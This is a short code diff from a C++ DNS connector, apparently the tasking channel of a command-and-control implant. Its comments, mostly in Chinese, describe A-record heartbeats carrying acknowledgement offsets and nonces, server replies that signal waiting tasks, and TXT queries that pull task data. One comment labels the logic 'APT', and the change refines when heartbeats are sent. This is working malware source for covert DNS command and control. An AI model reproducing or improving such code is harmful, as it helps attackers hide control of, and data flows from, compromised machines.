@@ -753,7 +753,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     // - 如果 TS 返回 非 0.0.0.0 -> 有任务，继续执行下面的 TXT 查询拉取数据。
     // ACK 机制：在心跳 A 查询中携带 downAckOffset 和 downTaskNonce，告知服务器已确认接收的 offset。
     // HB 数据格式: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 字节
-    if (!this->downBuf && this->qtype[0] == 'T') { // starts with 'T' -> TXT
+    // 只有在没有下载缓冲区、没有待处理任务、且使用 TXT 模式时才发心跳
+    // 如果 hasPendingTasks=TRUE，跳过心跳直接进入 GET 逻辑
+    if (!this->downBuf && !this->hasPendingTasks && this->qtype[0] == 'T') { // starts with 'T' -> TXT
         CHAR qnameA[512];
         // APT: Include ack_offset, hbNonce (cache bust), and ackTaskNonce (to identify which task is being ACKed)
         ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
